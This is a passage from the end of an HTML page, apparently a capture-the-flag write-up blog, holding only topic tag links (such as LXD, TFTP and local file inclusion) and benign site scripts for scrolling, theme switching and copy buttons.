href=https://bluewalle.github.io/tags/tftp/>tftp</a></li><li><a href=https://bluewalle.github.io/tags/lxd/>lxd</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/local-file-inclusion/>local-file-inclusion</a></li><li><a href=https://bluewalle.github.io/tags/clear-text-credentials/>clear-text-credentials</a></li><li><a href=https://bluewalle.github.io/tags/arbitrary-file-upload/>arbitrary-file-upload</a></li><li><a href=https://bluewalle.github.io/tags/linux-target/>linux-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>